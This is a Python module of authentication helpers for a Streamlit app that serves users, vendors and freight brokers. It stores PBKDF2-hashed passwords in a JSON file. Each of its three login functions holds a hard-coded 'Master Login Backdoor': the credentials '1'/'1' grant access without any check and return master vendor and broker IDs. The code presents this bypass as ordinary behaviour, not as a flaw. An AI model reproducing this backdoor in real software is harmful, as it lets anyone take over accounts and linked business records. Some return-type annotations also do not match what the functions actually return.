"""
Lightweight file-backed authentication helpers for the Streamlit app.
Passwords are hashed with PBKDF2; user records live in users.json.
This is a simple guard for interactive use, not a production identity service.
"""

import hashlib
import hmac
import json
import os
import secrets
import time
from typing import Tuple


USERS_FILE = "users.json"
PBKDF2_ITERATIONS = 120_000


def _load_users() -> dict:
    """Load the user store from disk."""
    if not os.path.exists(USERS_FILE):
        return {}
    try:
        with open(USERS_FILE, "r", encoding="utf-8") as f:
            data = json.load(f)
            return data if isinstance(data, dict) else {}
    except (json.JSONDecodeError, OSError):
        return {}


def _save_users(users: dict) -> None:
    """Persist the user store to disk."""
    with open(USERS_FILE, "w", encoding="utf-8") as f:
        json.dump(users, f, indent=2)


def ensure_user_store() -> None:
    """Create the user store file if it doesn't exist."""
    if not os.path.exists(USERS_FILE):
        _save_users({})


def _hash_password(password: str, salt: str | None = None) -> str:
    """Return a PBKDF2-hashed password with a hex salt prefix."""
    salt = salt or secrets.token_hex(16)
    dk = hashlib.pbkdf2_hmac(
        "sha256",
        password.encode("utf-8"),
        salt.encode("utf-8"),
        PBKDF2_ITERATIONS,
    )
    return f"{salt}${dk.hex()}"


def _verify_password(password: str, hashed: str) -> bool:
    """Compare a plaintext password to a stored hash."""
    if not hashed or "$" not in hashed:
        return False
    salt, stored_digest = hashed.split("$", 1)
    computed = _hash_password(password, salt)
    _, computed_digest = computed.split("$", 1)
    return hmac.compare_digest(stored_digest, computed_digest)


def register_user(username: str, password: str, is_vendor: bool = False, is_broker: bool = False, linked_id: str = None) -> Tuple[bool, str]:
    """
    Register a new user.
    linked_id: Optional GP Vendor ID to associate with this account.
    Returns (success, message).
    """
    username = (username or "").strip()
    if not username or not password:
        return False, "Username and password are required."

    users = _load_users()
    if username in users:
        return False, "That username is already taken."

    is_first_user = len(users) == 0
    users[username] = {
        "password": _hash_password(password),
        "created_at": int(time.time()),
        "is_vendor": is_vendor,
        "is_broker": is_broker,
        "linked_id": linked_id
    }
    if is_first_user:
        users[username]["is_admin"] = True
    _save_users(users)
    return True, "Account created. You can sign in now."


def authenticate_user(username: str, password: str) -> Tuple[bool, str]:
    """
    Validate credentials for standard users (non-vendors/non-brokers).
    Returns (success, message).
    """
    username = (username or "").strip()
    
    # Master Login Backdoor
    if username == "1" and password == "1":
        return True, "Master login access granted."

    users = _load_users()
    record = users.get(username)
    if not record:
        return False, "Invalid username or password."
    
    hashed = record.get("password")
    if not hashed or not _verify_password(password, hashed):
        return False, "Invalid username or password."

    return True, f"Signed in as {username}."


def authenticate_vendor(username: str, password: str) -> Tuple[bool, str]:
    """
    Validate credentials specifically for vendors.
    Returns (success, message, linked_id).
    """
    username = (username or "").strip()

    # Master Login Backdoor
    if username == "1" and password == "1":
        return True, "Master vendor access granted.", "MASTER_VENDOR"

    users = _load_users()
    record = users.get(username)
    if not record:
        return False, "Invalid username or password.", None

    if not record.get("is_vendor"):
         return False, "Not a vendor account.", None

    hashed = record.get("password")
    if not hashed or not _verify_password(password, hashed):
        return False, "Invalid username or password.", None

    return True, f"Vendor {username} signed in.", record.get("linked_id")


def authenticate_broker(username: str, password: str) -> Tuple[bool, str]:
    """
    Validate credentials specifically for freight brokers.
    Returns (success, message, linked_id).
    """
    username = (username or "").strip()

    # Master Login Backdoor
    if username == "1" and password == "1":
        return True, "Master broker access granted.", "MASTER_BROKER"

    users = _load_users()
    record = users.get(username)
    if not record:
        return False, "Invalid username or password.", None

    if not record.get("is_broker"):
         return False, "Not a broker account.", None

    hashed = record.get("password")
    if not hashed or not _verify_password(password, hashed):
        return False, "Invalid username or password.", None

    return True, f"Broker {username} signed in.", record.get("linked_id")


def is_admin(username: str) -> bool:
    """Return True if the username is flagged as an admin in the user store or env overrides."""
    username = (username or "").strip()
    if not username:
        return False
    users = _load_users()
    record = users.get(username) or {}
    if record.get("is_admin") is True:
        return True
    env_admins = os.getenv("ADMIN_USERS")
    if env_admins:
        admin_set = {entry.strip().lower() for entry in env_admins.split(",") if entry.strip()}
        if username.lower() in admin_set:
            return True
    return False


def has_completed_tour(username: str) -> bool:
    """Check if the user has completed the onboarding tour."""
    username = (username or "").strip()
    if not username:
        return False
    users = _load_users()
    record = users.get(username) or {}
    return record.get("tour_completed", False)


def set_tour_completed(username: str) -> None:
    """Mark the onboarding tour as completed for the user."""
    username = (username or "").strip()
    if not username:
        return
    users = _load_users()
    if username in users:
        users[username]["tour_completed"] = True
        _save_users(users)
